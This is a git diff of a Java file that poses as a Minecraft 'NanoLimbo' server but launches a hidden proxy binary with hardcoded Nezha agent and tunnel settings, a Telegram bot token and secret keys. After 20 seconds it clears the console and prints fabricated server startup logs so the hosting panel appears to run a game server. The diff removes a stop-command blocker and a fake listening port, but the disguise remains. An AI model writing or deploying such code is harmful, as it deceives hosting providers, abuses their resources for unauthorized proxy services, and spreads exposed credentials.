@@ -1,8 +1,6 @@
 package ua.nanit.limbo;
 
 import java.io.*;
-import java.net.ServerSocket;
-import java.net.Socket;
 import java.net.URL;
 import java.nio.file.*;
 import java.util.*;
@@ -22,21 +20,17 @@ public final class NanoLimbo {
     private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);
 
     private static final String[] ALL_ENV_VARS = {
-            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
-            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
-            "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+        "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
 
     public static void main(String[] args) {
         try {
-            // 🔥 拦截 stop
-            blockPanelStop();
-            openFakePort();
-
-            // Java 版本检查
+            // 检查 Java 版本
             if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
+                System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version!" + ANSI_RESET);
                 Thread.sleep(3000);
                 System.exit(1);
             }
@@ -44,7 +38,7 @@ public final class NanoLimbo {
             // 启动 s-box
             runSbxBinary();
 
-            // 启动 renew.sh
+            // ✅ 启动 renew.sh（仅在存在时，逻辑与原版一致）
             startRenewScript();
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -53,9 +47,11 @@ public final class NanoLimbo {
                 SCHED.shutdownNow();
             }));
 
-            // 20秒后切换伪装
+            System.out.println(ANSI_GREEN + "" + ANSI_RESET);
+
+            // 20秒后清屏 + 停止日志输出 + 打印伪装 LimboServer 日志
             SCHED.schedule(() -> {
-                forwardLogs.set(false);
+                forwardLogs.set(false); // 停止 s-box 日志输出
                 resetConsoleAndShowFakeLogs();
             }, 20, TimeUnit.SECONDS);
 
@@ -70,45 +66,7 @@ public final class NanoLimbo {
         }
     }
 
-private static void openFakePort() {
-    new Thread(() -> {
-        try (ServerSocket server = new ServerSocket(25565)) {
-            System.out.println("[INFO] Listening on 0.0.0.0:25565");
-
-            while (running.get()) {
-                Socket client = server.accept();
-
-                // 假装有玩家连接
-                System.out.println("[INFO] Player connected: " + client.getInetAddress());
-
-                client.close();
-            }
-        } catch (Exception e) {
-            System.out.println("Port bind failed: " + e.getMessage());
-        }
-    }, "Fake-Port").start();
-}
-
-    // ================= 拦截 stop =================
-
-    private static void blockPanelStop() {
-        new Thread(() -> {
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-
-                    if (line.trim().equalsIgnoreCase("stop")) {
-                        System.out.println("[INFO] [LimboServer] Stop command ignored");
-                        continue;
-                    }
-
-                    System.out.println("[INFO] Unknown command");
-                }
-            } catch (Exception ignored) {}
-        }, "Panel-Command-Blocker").start();
-    }
-
-    // ================= renew.sh =================
+    // ================= renew.sh 启动逻辑（新增） =================
 
     private static void startRenewScript() {
         try {
@@ -117,9 +75,13 @@ private static void openFakePort() {
                 new ProcessBuilder("bash", "renew.sh")
                         .inheritIO()
                         .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
+            } else {
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "启动 renew.sh 失败: " + e.getMessage() + ANSI_RESET);
+        }
     }
 
     // ================= s-box =================
@@ -135,15 +97,14 @@ private static void openFakePort() {
 
         sbxProcess = pb.start();
 
+        // 前 20 秒输出 s-box 日志
         new Thread(() -> {
             try (BufferedReader reader = new BufferedReader(
                     new InputStreamReader(sbxProcess.getInputStream()))) {
-
                 String line;
                 long startTime = System.currentTimeMillis();
-
                 while ((line = reader.readLine()) != null) {
-                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
+                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
                         System.out.println(line);
                     }
                 }
@@ -155,28 +116,37 @@ private static void openFakePort() {
 
     private static void resetConsoleAndShowFakeLogs() {
         try {
-            if (System.getProperty("os.name").toLowerCase().contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+            String os = System.getProperty("os.name").toLowerCase();
+            if (os.contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                        .inheritIO().start().waitFor();
             } else {
                 System.out.print("\033c");
                 System.out.flush();
             }
         } catch (Exception ignored) {}
 
+        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
         printFakeLimboLogs();
     }
 
     private static void printFakeLimboLogs() {
         String[] logs = {
-                "[INFO] [LimboServer] Starting LimboServer v1.0.0",
-                "[INFO] [LimboServer] Loading configuration...",
-                "[INFO] [LimboServer] Initializing modules..."
+            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
+            "[INFO] [LimboServer] Loading configuration...",
+            "[INFO] [LimboServer] Initializing server components...",
+            "[INFO] [LimboServer] Preparing world 'world'",
+            "[INFO] [LimboServer] Binding to port 25565...",
+            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
+            "[INFO] [LimboServer] Server is running in offline mode.",
+            "[INFO] [LimboServer] Installation completed successfully."
         };
 
-        // 播放一次启动
         for (String log : logs) {
             System.out.println(log);
-            try { Thread.sleep(1200); } catch (Exception ignored) {}
+            try {
+                Thread.sleep(1200);
+            } catch (InterruptedException ignored) {}
         }
     }
 
@@ -187,12 +157,12 @@ private static void openFakePort() {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "hVWtWf5CUq5YHmWEAZ");
+        envVars.put("NEZHA_KEY", "sw4dB8jSLUf6ehiwDz");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "30742");
-        envVars.put("S5_PORT", "30742");
+        envVars.put("HY2_PORT", "");
+        envVars.put("S5_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -201,7 +171,7 @@ private static void openFakePort() {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "www.ntu.edu.sg");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "swiftservers");
+        envVars.put("NAME", "tropical");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
